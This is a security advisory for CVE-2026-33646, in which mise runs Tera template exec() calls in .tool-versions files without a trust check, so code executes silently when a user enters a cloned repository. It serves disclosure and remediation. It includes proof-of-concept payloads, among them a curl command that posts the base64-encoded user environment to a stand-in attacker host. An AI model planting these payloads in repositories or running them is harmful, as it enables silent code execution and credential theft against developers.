# [C] Mise Vulnerable to Arbitrary Code Execution via Tera Templates in .tool-versions Files (Trust Bypass)

## Summary
Severity: Critical
Advisory: GHSA-fjj5-v948-whjj
CVE: CVE-2026-33646
CWE: CWE-94
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-fjj5-v948-whjj
Type: github-advisory

## Affected
- crates.io: `mise` — affected >=0 <2026.3.10

## Details
## Summary

Mise processes `.tool-versions` files through the Tera template engine during parsing, with the `exec()` function registered, enabling arbitrary command execution. Unlike `.mise.toml` files, `.tool-versions` files are **not subject to trust verification** in non-paranoid mode. This means an attacker can place a malicious `.tool-versions` file in a git repository, and when a victim with mise activated `cd`s into the directory, arbitrary commands execute without any trust prompt.

## Vulnerability Details

### Vulnerable Code

**File:** `src/config/config_file/tool_versions.rs`, lines 60-63

```rust
pub fn parse_str(s: &str, path: PathBuf) -> Result<Self> {
    let mut cf = Self::init(&path);
    let dir = path.parent();
    let s = get_tera(dir).render_str(s, &cf.context)?;  // <-- No trust check
    // ...
}
```

**File:** `src/tera.rs`, lines 385-391

```rust
pub fn get_tera(dir: Option<&Path>) -> Tera {
    let mut tera = TERA.clone();
    let dir = dir.map(PathBuf::from);
    tera.register_function("exec", tera_exec(dir.clone(), env::PRISTINE_ENV.clone()));
    tera.register_function("read_file", tera_read_file(dir));
    tera
}
```

**File:** `src/tera.rs`, lines 394-452 -- `tera_exec` passes the `command` argument to a shell for execution with no restrictions.

**File:** `src/config/config_file/mod.rs`, lines 272-287

```rust
pub async fn parse(path: &Path) -> Result<Arc<dyn ConfigFile>> {
    if let Ok(settings) = Settings::try_get()
        && settings.paranoid
    {
        trust_check(path)?;  // Only in paranoid mode!
    }
    match detect_config_file_type(path).await {
        // ...
        Some(ConfigFileType::ToolVersions) => Ok(Arc::new(ToolVersions::from_file(path)?)),
        // ...
    }
}
```

### Attack Vector

1. An attacker creates a `.tool-versions` file in a git repository containing Tera template syntax with the `exec()` function.
2. The victim clones the repository and has mise activated in their shell (via `eval "$(mise activate zsh)"` or equivalent).
3. When the victim `cd`s into the repository directory, mise's shell hook (`hook-env`) fires automatically.
4. `hook-env` loads and parses config files, including `.tool-versions`.
5. During parsing, `ToolVersions::parse_str` processes the file content through `get_tera(dir).render_str()`.
6. The Tera engine evaluates `{{ exec(command="...") }}`, executing arbitrary commands as the victim's user.
7. No trust prompt is displayed because `trust_check` is not called for `.tool-versions` files in non-paranoid mode.

### Execution Context

- Commands execute as the current user with full access to their environment.
- The pristine environment (`env::PRISTINE_ENV`) is passed to the executed command, which includes all of the user's environment variables (potentially including tokens, credentials, SSH agents, etc.).
- Execution happens silently during the prompt hook -- the user sees no indication that code was run.

### Contrast with .mise.toml

`.mise.toml` files are protected: `MiseToml::from_str()` calls `trust_check(path)` before any parsing occurs (line 213 of `mise_toml.rs`). During `hook-env`, untrusted `.mise.toml` files fail to parse with an `UntrustedConfig` error, preventing any code execution. `.tool-versions` files lack this protection entirely.

## Steps to Reproduce

### Prerequisites

- mise installed (`brew install mise` or equivalent)
- Shell activation enabled: `eval "$(mise activate zsh)"` (or bash/fish)
- Default settings (paranoid mode NOT enabled — this is the default)

### PoC: Silent RCE on `cd`

**Step 1:** Create a directory simulating a cloned repository with a malicious `.tool-versions`:

```bash
mkdir -p /tmp/poc-mise-repo
cd /tmp/poc-mise-repo
git init

cat > .tool-versions << 'EOF'
{{ exec(command="id > /tmp/mise-rce-proof && echo SUCCESS=$(whoami) >> /tmp/mise-rce-proof && date >> /tmp/mise-rce-proof") }}node 20.0.0
python 3.11.0
EOF

git add -A && git commit -m "Initial commit"
```

Note: The `exec()` output is concatenated with `node` so the resulting line parses as a valid tool-versions entry. The payload redirects all output to a file, producing no stdout — the `exec()` returns an empty string, making the line evaluate to `node 20.0.0`.

**Step 2:** In a new shell with mise activated, enter the directory:

```bash
eval "$(mise activate zsh)"
cd /tmp/poc-mise-repo
```

**Step 3:** Verify arbitrary code execution:

```bash
cat /tmp/mise-rce-proof
```

**Expected output:**
```
uid=501(youruser) gid=20(staff) groups=20(staff),...
SUCCESS=youruser
Mon Mar 16 21:34:46 IST 2026
```

No trust prompt, no warning, no error output. The `id` command executed silently as the current user.

### Validated Test Results

Tested on 2026-03-16 with:
- mise 2026.3.9 macos-arm64
- macOS Darwin 24.5.0 arm64
- zsh 5.9
- Paranoid mode: `false` (default)

**Test 1 — `.tool-versions` (no trust check):**
```
$ rm -f /tmp/mise-rce-proof
$ zsh -c 'eval "$(mise activate zsh)" && cd /tmp/poc-mise-repo && pwd'
/tmp/poc-mise-repo
$ cat /tmp/mise-rce-proof
uid=501(golan) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...
SUCCESS=golan
Mon Mar 16 21:34:46 IST 2026
```

Command executed silently. No trust prompt. No errors.

**Test 2 — `.mise.toml` with same payload (trust check blocks execution):**
```
$ mkdir -p /tmp/poc-mise-toml
$ cat > /tmp/poc-mise-toml/.mise.toml << 'TOMLEOF'
[tools]
node = "{{ exec(command='id > /tmp/mise-hook-pwned') }}20.0.0"
TOMLEOF
$ rm -f /tmp/mise-hook-pwned
$ zsh -c 'eval "$(mise activate zsh)" && cd /tmp/poc-mise-toml && pwd'
mise ERROR Config files in /private/tmp/poc-mise-toml/.mise.toml are not trusted.
Trust them with `mise trust`. See https://mise.jdx.dev/cli/trust.html
$ cat /tmp/mise-hook-pwned
cat: /tmp/mise-hook-pwned: No such file or directory
```

`.mise.toml` correctly blocked by trust verification. `.tool-versions` bypasses it entirely.

### Alternative PoC (data exfiltration)

```
{{ exec(command="curl -s -X POST -d \"$(env | base64)\" https://attacker.example.com/collect -o /dev/null") }}python 3.11.0
```

## Impact

- **Arbitrary code execution** on any machine where a user with mise activated enters a directory containing a malicious `.tool-versions` file.
- **Supply chain attack vector**: `.tool-versions` is a widely-used convention from asdf-vm and is commonly committed to repositories. Developers expect it to contain only tool names and versions, not executable content.
- **Silent execution**: No trust prompt, warning, or user interaction required.
- **Full user privilege escalation**: Commands run with the full privileges and environment of the current user.
- **Credential theft**: The user's full environment (including tokens, API keys, SSH agent) is available to the executed command.
- **Widespread potential impact**: Any open-source project with a `.tool-versions` file could be targeted. A malicious PR adding tera syntax to an existing `.tool-versions` file could execute code on all reviewers' machines.

## Suggested Fix

### Option 1: Add trust_check to .tool-versions parsing (recommended)

```rust
// In src/config/config_file/tool_versions.rs
pub fn from_file(path: &Path) -> Result<Self> {
    trace!("parsing tool-versions: {}", path.display());
    Self::parse_str(&file::read_to_string(path)?, path.to_path_buf())
}

pub fn parse_str(s: &str, path: PathBuf) -> Result<Self> {
    let mut cf = Self::init(&path);
    let dir = path.parent();
    // Only use tera if the file contains template syntax AND is trusted
    let s = if s.contains("{{") || s.contains("{%") || s.contains("{#") {
        trust_check(&path)?;
        get_tera(dir).render_str(s, &cf.context)?
    } else {
        s.to_string()
    };
    // ...
}
```

### Option 2: Remove exec() from .tool-versions tera context

Create a separate `get_tera_safe()` that does not register the `exec` function, and use it for `.tool-versions` parsing.

### Option 3: Remove tera processing from .tool-versions entirely

`.tool-versions` is an asdf-compatible format that historically does not support templates. Removing tera from its parsing would be the safest approach and most consistent with user expectations.

## References
- https://github.com/jdx/mise/security/advisories/GHSA-fjj5-v948-whjj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33646
- https://github.com/jdx/mise
